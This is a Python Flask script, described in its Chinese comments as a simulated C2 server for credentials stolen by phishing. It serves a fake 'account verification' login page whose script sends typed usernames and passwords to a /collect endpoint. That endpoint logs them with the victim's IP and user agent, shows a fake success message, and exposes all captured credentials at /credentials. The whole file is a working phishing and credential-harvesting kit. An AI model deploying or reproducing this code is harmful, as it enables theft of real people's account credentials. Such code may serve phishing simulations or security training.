#!/usr/bin/env python3
"""
凭证收集服务器 - 模拟C2服务器接收钓鱼攻击窃取的凭证
"""

import json
import time
from datetime import datetime
from flask import Flask, request, jsonify
import logging

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# 存储收集到的凭证
collected_credentials = []

@app.route('/phish', methods=['GET'])
def phishing_page():
    """钓鱼页面"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>账户验证 - 请登录</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; background: white; border-radius: 5px; }
            input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; border: 1px solid #ddd; border-radius: 3px; }
            button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; cursor: pointer; border-radius: 3px; }
            button:hover { background: #005a87; }
        </style>
    </head>
    <body>
        <div class="login-form">
            <h2>账户验证</h2>
            <p>为了确保您的账户安全，请重新验证您的登录信息：</p>
            <form id="loginForm">
                <input type="text" id="username" placeholder="用户名/邮箱" required>
                <input type="password" id="password" placeholder="密码" required>
                <button type="submit">验证账户</button>
            </form>
        </div>
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;
                
                // 发送凭证到收集服务器
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString()
                    })
                }).then(response => response.json())
                .then(data => {
                    alert('验证成功！您的账户已安全。');
                });
            });
        </script>
    </body>
    </html>
    """
    return html

@app.route('/collect', methods=['POST'])
def collect_credentials():
    """接收钓鱼攻击窃取的凭证"""
    try:
        data = request.get_json() or request.form.to_dict()
        
        # 记录凭证
        credential_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
            'credentials': data
        }
        
        collected_credentials.append(credential_data)
        
        logger.info(f"收到凭证: {data}")
        
        # 返回成功响应（模拟正常登录页面）
        return jsonify({
            'status': 'success',
            'message': 'Login successful'
        }), 200
        
    except Exception as e:
        logger.error(f"处理凭证时出错: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/credentials', methods=['GET'])
def get_credentials():
    """获取所有收集到的凭证（用于调试）"""
    return jsonify({
        'count': len(collected_credentials),
        'credentials': collected_credentials
    })

@app.route('/health', methods=['GET'])
def health_check():
    """健康检查"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'collected_count': len(collected_credentials)
    })

if __name__ == '__main__':
    logger.info("启动凭证收集服务器...")
    app.run(host='0.0.0.0', port=9000, debug=False) 